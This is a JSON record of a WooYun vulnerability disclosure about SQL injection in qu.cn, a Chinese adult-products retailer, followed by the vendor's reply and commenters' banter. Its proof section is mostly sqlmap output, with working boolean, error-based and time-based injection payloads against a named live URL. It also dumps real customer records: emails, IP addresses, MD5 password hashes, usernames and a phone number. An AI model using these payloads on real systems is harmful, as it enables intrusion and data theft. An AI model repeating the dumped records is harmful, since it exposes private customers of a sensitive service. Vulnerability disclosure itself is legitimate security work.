{"id": 4324, "wybug_id": "wooyun-2015-0123841", "wybug_title": "国内知名情趣用品趣网一处SQL注入漏洞(用户隐私泄露不是闹着玩的)", "wybug_corp": "qu.cn", "wybug_author": "小龙", "wybug_date": "2015-07-05 11:51", "wybug_open_date": "2015-08-19 21:44", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射", "字符类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-19：\t细节向公众公开  简要描述： 不少开豪车的都已经按耐不住了。。。 详细说明：  \n\n其APP下载多达3.9万\n\n本来这些东西都是最个人隐私的了。。。对外公开的话就。。。。   漏洞证明：  \nhttp://m.qu.cn/order.php?act=detail&order_sn=2015063022182118031\n\nF:\\Python27\\sqlmap>sqlmap.py -r C:\\1.txt --dbs         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150529}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 08:00:25[08:00:25] [INFO] parsing HTTP request from 'C:\\1.txt'[08:00:26] [INFO] resuming back-end DBMS 'mysql'[08:00:26] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: order_sn (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: act=detail&order_sn=2015063022182118031 AND 1586=1586    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: act=detail&order_sn=2015063022182118031 AND (SELECT 7124 FROM(SELECT COUNT(*),CONCAT(0x716a716271,(SELECT (ELT(7124=7124,1))),0x7178787a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: act=detail&order_sn=2015063022182118031 AND (SELECT * FROM (SELECT(SLEEP(5)))QqNq)---[08:00:27] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL 5.0[08:00:27] [INFO] fetching database names[08:00:27] [INFO] the SQL query used returns 4 entries[08:00:27] [INFO] resumed: information_schema[08:00:27] [INFO] resumed: qu_cc[08:00:27] [INFO] resumed: qu_cc_fx[08:00:27] [INFO] resumed: testavailable databases [4]:[*] information_schema[*] qu_cc[*] qu_cc_fx[*] test[08:00:27] [INFO] fetched data logged to text files under 'C:\\Users\\Administrator\\.sqlmap\\output\\m.qu.cn'\n\n[08:03:34] [INFO] retrieved:[08:03:35] [INFO] retrieved: 529899272@qq.com[08:03:35] [INFO] retrieved: 0[08:03:35] [INFO] retrieved: 0.00[08:03:35] [INFO] retrieved:[08:03:36] [INFO] retrieved: 0[08:03:36] [INFO] retrieved: 0[08:03:36] [INFO] retrieved: 0[08:03:37] [INFO] retrieved: 0[08:03:37] [INFO] retrieved: 122.227.0.186[08:03:37] [INFO] retrieved: 1305375707[08:03:38] [INFO] retrieved: 0000-00-00 00:00:00[08:03:38] [INFO] retrieved:[08:03:38] [INFO] retrieved:[08:03:38] [INFO] retrieved:[08:03:39] [INFO] retrieved: 0[08:03:39] [INFO] retrieved:[08:03:39] [INFO] retrieved:[08:03:39] [INFO] retrieved: d54d1702ad0f8326224b817c796763c9[08:03:40] [INFO] retrieved: 0[08:03:40] [INFO] retrieved:[08:03:41] [INFO] retrieved:[08:03:41] [INFO] retrieved: 0[08:03:41] [INFO] retrieved: 1305375707[08:03:41] [INFO] retrieved: 0[08:03:42] [INFO] retrieved: 1[08:03:42] [INFO] retrieved: 14[08:03:42] [INFO] retrieved: 0.00[08:03:43] [INFO] retrieved: dkaadk[08:03:43] [INFO] retrieved: 0[08:03:43] [INFO] retrieved:[08:03:43] [INFO] retrieved: 1[08:03:44] [INFO] retrieved: 0[08:03:44] [INFO] retrieved:[08:03:44] [INFO] retrieved:[08:03:44] [INFO] retrieved:[08:03:45] [INFO] retrieved: 0000-00-00[08:03:45] [INFO] retrieved:[08:03:45] [INFO] retrieved: 0.00[08:03:46] [INFO] retrieved:[08:03:46] [INFO] retrieved: zy123456@qq.com[08:03:46] [INFO] retrieved: 0[08:03:46] [INFO] retrieved: 0.00[08:03:47] [INFO] retrieved:[08:03:47] [INFO] retrieved: 0[08:03:47] [INFO] retrieved: 0[08:03:48] [INFO] retrieved: 0[08:03:48] [INFO] retrieved: 0[08:03:48] [INFO] retrieved: 122.227.0.186[08:03:48] [INFO] retrieved: 1305384239[08:03:49] [INFO] retrieved: 0000-00-00 00:00:00[08:03:49] [INFO] retrieved:[08:03:49] [INFO] retrieved:[08:03:50] [INFO] retrieved:[08:03:50] [INFO] retrieved: 0[08:03:50] [INFO] retrieved:[08:03:51] [INFO] retrieved:[08:03:51] [INFO] retrieved: 704a051e3ff0df4e71eb97063405665f[08:03:51] [INFO] retrieved: 0[08:03:52] [INFO] retrieved:[08:03:52] [INFO] retrieved:[08:03:52] [INFO] retrieved: 0[08:03:52] [INFO] retrieved: 1305384239[08:03:53] [INFO] retrieved: 0[08:03:53] [INFO] retrieved: 1[08:03:54] [INFO] retrieved: 15[08:03:54] [INFO] retrieved: 0.00[08:03:54] [INFO] retrieved: 15173004931[08:03:54] [INFO] retrieved: 0[08:03:55] [INFO] retrieved:[08:03:55] [INFO] retrieved: 1[08:03:55] [INFO] retrieved: 0[08:03:56] [INFO] retrieved:[08:03:56] [INFO] retrieved:[08:03:56] [INFO] retrieved:[08:03:56] [INFO] retrieved: 0000-00-00[08:03:57] [INFO] retrieved:[08:03:57] [INFO] retrieved: 0.00[08:03:57] [INFO] retrieved:[08:03:58] [INFO] retrieved: 537517578@qq.com[08:03:58] [INFO] retrieved: 0[08:03:58] [INFO] retrieved: 0.00[08:03:58] [INFO] retrieved:[08:03:59] [INFO] retrieved: 0[08:03:59] [INFO] retrieved: 0[08:03:59] [INFO] retrieved: 0[08:04:00] [INFO] retrieved: 0[08:04:00] [INFO] retrieved: 221.229.86.178[08:04:00] [INFO] retrieved: 1305391160[08:04:01] [INFO] retrieved: 0000-00-00 00:00:00[08:04:01] [INFO] retrieved:[08:04:01] [INFO] retrieved:[08:04:01] [INFO] retrieved:[08:04:02] [INFO] retrieved: 0[08:04:02] [INFO] retrieved:[08:04:02] [INFO] retrieved:[08:04:02] [INFO] retrieved: 4fb4ec774149f7b2e531e8f9d972604d[08:04:03] [INFO] retrieved: 0[08:04:03] [INFO] retrieved:[08:04:03] [INFO] retrieved:[08:04:04] [INFO] retrieved: 0[08:04:04] [INFO] retrieved: 1305391160[08:04:04] [INFO] retrieved: 0[08:04:04] [INFO] retrieved: 1[08:04:05] [INFO] retrieved: 16[08:04:05] [INFO] retrieved: 0.00[08:04:05] [INFO] retrieved: qq537517578[08:04:06] [INFO] retrieved: 0[08:04:06] [INFO] retrieved:[08:04:06] [INFO] retrieved: 1[08:04:06] [INFO] retrieved: 8713944[08:04:07] [INFO] retrieved:[08:04:07] [INFO] retrieved:[08:04:07] [INFO] retrieved:[08:04:08] [INFO] retrieved: 0000-00-00[08:04:08] [INFO] retrieved:[08:04:08] [INFO] retrieved: 0.00[08:04:09] [INFO] retrieved: 9383[08:04:09] [INFO] retrieved: 326367223@qq.com[08:04:09] [INFO] retrieved: 0[08:04:09] [INFO] retrieved: 0.00[08:04:10] [INFO] retrieved:[08:04:10] [INFO] retrieved: 0[08:04:10] [INFO] retrieved: 0[08:04:11] [INFO] retrieved: 0[08:04:11] [INFO] retrieved: 3[08:04:11] [INFO] retrieved: 113.204.53.99[08:04:11] [INFO] retrieved: 1390444758[08:04:12] [INFO] retrieved: 0000-00-00 00:00:00[08:04:12] [INFO] retrieved:[08:04:12] [INFO] retrieved:[08:04:13] [INFO] retrieved:[08:04:13] [INFO] retrieved: 0[08:04:13] [INFO] retrieved:[08:04:13] [INFO] retrieved:[08:04:14] [INFO] retrieved: 94b14ce5b76cfa1552a192cecb97e3ae[08:04:14] [INFO] retrieved: 0[08:04:14] [INFO] retrieved:[08:04:15] [INFO] retrieved:[08:04:15] [INFO] retrieved: 0[08:04:15] [INFO] retrieved: 1305449145[08:04:15] [INFO] retrieved: 0[08:04:16] [INFO] retrieved: 1[08:04:16] [INFO] retrieved: 17[08:04:16] [INFO] retrieved: 0.00[08:04:17] [INFO] retrieved: wwm89888[08:04:17] [INFO] retrieved: 0[08:04:17] [INFO] retrieved:[08:04:17] [INFO] retrieved: 534[08:04:18] [INFO] retrieved: 0[08:04:18] [INFO] retrieved:[08:04:18] [INFO] retrieved:[08:04:19] [INFO] retrieved:[08:04:19] [INFO] retrieved: 0000-00-00[08:04:19] [INFO] retrieved:[08:04:20] [INFO] retrieved: 0.00[08:04:20] [INFO] retrieved:[08:04:20] [INFO] retrieved: 1261489024@qq.com[08:04:20] [INFO] retrieved: 0[08:04:21] [INFO] retrieved: 0.00[08:04:21] [INFO] retrieved:[08:04:21] [INFO] retrieved: 0[08:04:22] [INFO] retrieved: 0[08:04:22] [INFO] retrieved: 0[08:04:22] [INFO] retrieved: 0[08:04:22] [INFO] retrieved: 119.1.212.59[08:04:23] [INFO] retrieved: 1305457514[08:04:23] [INFO] retrieved: 0000-00-00 00:00:00[08:04:23] [INFO] retrieved:[08:04:24] [INFO] retrieved:[08:04:24] [INFO] retrieved:[08:04:24] [INFO] retrieved: 0[08:04:24] [INFO] retrieved:[08:04:25] [INFO] retrieved:[08:04:25] [INFO] retrieved: e0090f136f993b7d03074fe4e93e16ea[08:04:25] [INFO] retrieved: 0[08:04:26] [INFO] retrieved:[08:04:26] [INFO] retrieved:[08:04:26] [INFO] retrieved: 0[08:04:26] [INFO] retrieved: 1305457514[08:04:27] [INFO] retrieved: 0[08:04:28] [INFO] retrieved: 1[08:04:28] [INFO] retrieved: 18[08:04:28] [INFO] retrieved: 0.00[08:04:28] [INFO] retrieved: 1261489024[08:04:29] [INFO] retrieved: 0[08:04:29] [INFO] retrieved:[08:04:29] [INFO] retrieved: 1[08:04:30] [INFO] retrieved: 0[08:04:30] [INFO] retrieved:[08:04:30] [INFO] retrieved:[08:04:30] [INFO] retrieved:[08:04:31] [INFO] retrieved: 0000-00-00[08:04:31] [INFO] retrieved:[08:04:31] [INFO] retrieved: 0.00[08:04:32] [INFO] retrieved:[08:04:32] [INFO] retrieved: huigui01@126.com[08:04:32] [INFO] retrieved: 0[08:04:32] [INFO] retrieved: 0.00[08:04:33] [INFO] retrieved:[08:04:33] [INFO] retrieved: 0[08:04:33] [INFO] retrieved: 0[08:04:34] [INFO] retrieved: 0[08:04:34] [INFO] retrieved: 0[08:04:34] [INFO] retrieved:[08:04:34] [INFO] retrieved: 0[08:04:35] [INFO] retrieved: 0000-00-00 00:00:00[08:04:35] [INFO] retrieved:[08:04:36] [INFO] retrieved:[08:04:36] [INFO] retrieved:[08:04:36] [INFO] retrieved: 0[08:04:37] [INFO] retrieved:[08:04:37] [INFO] retrieved:[08:04:37] [INFO] retrieved: fa7c65f607c5d20f09731ae7dfe5d81b[08:04:38] [INFO] retrieved: 0[08:04:38] [INFO] retrieved:[08:04:38] [INFO] retrieved:[08:04:39] [INFO] retrieved: 0[08:04:39] [INFO] retrieved: 0[08:04:39] [INFO] retrieved: 0[08:04:39] [INFO] retrieved: 1[08:04:40] [INFO] retrieved: 19[08:04:40] [INFO] retrieved: 0.00[08:04:40] [INFO] retrieved: 130546651710[08:04:40] [INFO] retrieved: 0[08:04:41] [INFO] retrieved:[08:04:41] [INFO] retrieved: 1[08:04:41] [INFO] retrieved: 0[08:04:42] [INFO] retrieved:[08:04:42] [INFO] retrieved:[08:04:42] [INFO] retrieved:[08:04:42] [INFO] retrieved: 0000-00-00[08:04:43] [INFO] retrieved:[08:04:43] [INFO] retrieved: 0.00[08:04:43] [INFO] retrieved:[08:04:44] [INFO] retrieved: 28322007qq@.com[08:04:44] [INFO] retrieved: 0[08:04:44] [INFO] retrieved: 0.00[08:04:44] [INFO] retrieved:[08:04:45] [INFO] retrieved: 0[08:04:45] [INFO] retrieved: 0[08:04:45] [INFO] retrieved: 0[08:04:46] [INFO] retrieved: 0[08:04:46] [INFO] retrieved: 113.82.208.134[08:04:46] [INFO] retrieved: 1305491393[08:04:47] [INFO] retrieved: 0000-00-00 00:00:00[08:04:47] [INFO] retrieved:[08:04:48] [INFO] retrieved:[08:04:48] [INFO] retrieved:[08:04:48] [INFO] retrieved: 0[08:04:48] [INFO] retrieved:[08:04:49] [INFO] retrieved:[08:04:49] [INFO] retrieved: 9c1b8a8eec115e68f7b02dc8e142c1fe[08:04:49] [INFO] retrieved: 0[08:04:50] [INFO] retrieved:[08:04:50] [INFO] retrieved:[08:04:50] [INFO] retrieved: 0[08:04:51] [INFO] retrieved: 1305491393[08:04:51] [INFO] retrieved: 0[08:04:51] [INFO] retrieved: 1[08:04:51] [INFO] retrieved: 20[08:04:52] [INFO] retrieved: 0.00[08:04:52] [INFO] retrieved: 1150335498[08:04:52] [INFO] retrieved: 0[08:04:53] [INFO] retrieved:[08:04:53] [INFO] retrieved: 1[08:04:53] [INFO] retrieved: 0[08:04:53] [INFO] retrieved:[08:04:54] [INFO] retrieved:[08:04:54] [INFO] retrieved:[08:04:54] [INFO] retrieved: 0000-00-00[08:04:55] [INFO] retrieved:[08:04:55] [INFO] retrieved: 0.00[08:04:55] [INFO] retrieved:[08:04:55] [INFO] retrieved: monman1413@hotmail.com[08:04:56] [INFO] retrieved: 0[08:04:56] [INFO] retrieved: 0.00[08:04:57] [INFO] retrieved:[08:04:57] [INFO] retrieved: 0[08:04:57] [INFO] retrieved: 0[08:04:57] [INFO] retrieved: 0[08:04:58] [INFO] retrieved: 0[08:04:58] [INFO] retrieved: 122.227.0.186[08:04:58] [INFO] retrieved: 1305495418[08:04:59] [INFO] retrieved: 0000-00-00 00:00:00[08:04:59] [INFO] retrieved:[08:04:59] [INFO] retrieved:[08:04:59] [INFO] retrieved:[08:05:00] [INFO] retrieved: 0[08:05:00] [INFO] retrieved:[08:05:00] [INFO] retrieved:[08:05:00] [INFO] retrieved: 29a5f80b85588c7e96ffd1c645808b20[08:05:01] [INFO] retrieved: 0[08:05:01] [INFO] retrieved:[08:05:01] [INFO] retrieved:[08:05:02] [INFO] retrieved: 0[08:05:02] [INFO] retrieved: 1305495418[08:05:02] [INFO] retrieved: 0[08:05:02] [INFO] retrieved: 1\n   修复方案：  1:过滤注入，把'转换成 单撇号/   版权声明：转载请注明来源 小龙@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2015-07-05 21:43 厂商回复： 感谢提供漏洞详情 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-01 14:13 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  。。。你最近很喜欢搞这类网站啊    \n     2015-07-01 18:26 |    \t\t小龙 \t\t\t( 普通白帽子  |\t\t\t        Rank:1208 漏洞数:316        | 乌云有着这么一群人，在乌云学技术，去某数...)\t\t \n  @px1624 学姿势啊。。庞总传授几招啊    \n     2015-07-05 00:02 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @px1624 支持庞总，招到司机了吗？？    \n     2015-07-05 00:48 |    \t\t小龙 \t\t\t( 普通白帽子  |\t\t\t        Rank:1208 漏洞数:316        | 乌云有着这么一群人，在乌云学技术，去某数...)\t\t \n  @wefgod 呵呵，还司机？庞总最近在闷声做大事呢，我不会透漏消息给你的，哈哈，庞总用的可是外星人笔记本    \n     2015-07-05 11:55 |    \t\t随随意意 \t\t\t( 普通白帽子  |\t\t\t        Rank:160 漏洞数:35        | 我对XSS并非真爱(┬＿┬)最近有人冒充该...)\t\t \n  ST小龙？    \n     2015-07-05 11:56 |    \t\t带头大哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:257 漏洞数:81        | 很早前，我就有个梦想。哪一天能站在国家会...)\t\t \n  666    \n     2015-07-05 12:00 |    \t\t小龙 \t\t\t( 普通白帽子  |\t\t\t        Rank:1208 漏洞数:316        | 乌云有着这么一群人，在乌云学技术，去某数...)\t\t \n  我去，小厂商变大厂商了- -意想不到。。。    \n     2015-07-05 12:37 |    \t\tpyphrb \t\t\t( 实习白帽子  |\t\t\t        Rank:47 漏洞数:6        | ...........................................)\t\t \n  是不是深夜，难眠啊，你的妹子呢    \n     2015-07-05 12:56 |    \t\t随随意意 \t\t\t( 普通白帽子  |\t\t\t        Rank:160 漏洞数:35        | 我对XSS并非真爱(┬＿┬)最近有人冒充该...)\t\t \n  @pyphrb 这是群里那个？    \n     2015-07-05 14:57 |    \t\tpyphrb \t\t\t( 实习白帽子  |\t\t\t        Rank:47 漏洞数:6        | ...........................................)\t\t \n  @随随意意 不是群里的    \n     2015-07-06 01:27 |    \t\t小龙 \t\t\t( 普通白帽子  |\t\t\t        Rank:1208 漏洞数:316        | 乌云有着这么一群人，在乌云学技术，去某数...)\t\t \n  @鸿巨科技有限公司 才给8分啊，囧，这种上万数据都没4分之二的rank。。。你们应该制定下评分标准哈。。    \n     2015-07-06 08:07 |    \t\t’‘Nome \t\t\t( 实习白帽子  |\t\t\t        Rank:55 漏洞数:19        | 在此感谢 @M4sk @mango @裤裆 @泳少 @5up3r...)\t\t \n  @小龙 说明用户信息隐私就是闹着玩的，给你8分是看得起你OK？这就是厂商态度，希望还有续集，加油！    \n     2015-07-06 18:00 |    \t\t小龙 \t\t\t( 普通白帽子  |\t\t\t        Rank:1208 漏洞数:316        | 乌云有着这么一群人，在乌云学技术，去某数...)\t\t \n  @’‘Nome  WooYun: 趣网旗下品酒网一处SQL注入(厂商修复没有一系列的流程导致躺枪)  连续剧，^_^    \n     2015-07-09 11:54 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @小龙 明白，支持庞总壮大生意    \n     2015-08-19 22:29 |    \t\tmy强哥 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:6        | 一个测试小菜鸟，希望在乌云学到更多的东西...)\t\t \n  我去第一个人居然是我大绵阳的人..............    \n     2015-08-20 07:56 |    \t\tWooyun第一大屌 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:3        )\t\t \n  厂商没有送小礼品“飞机杯”，”TT“,\"韩红版充气娃娃\"。 给洞主嘛？    \n     2015-08-20 15:37 |    \t\t卡卡 \t\t\t( 普通白帽子  |\t\t\t        Rank:447 漏洞数:52        | <script>alert('安全团队长期招人')</scrip...)\t\t \n  ecshop...    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}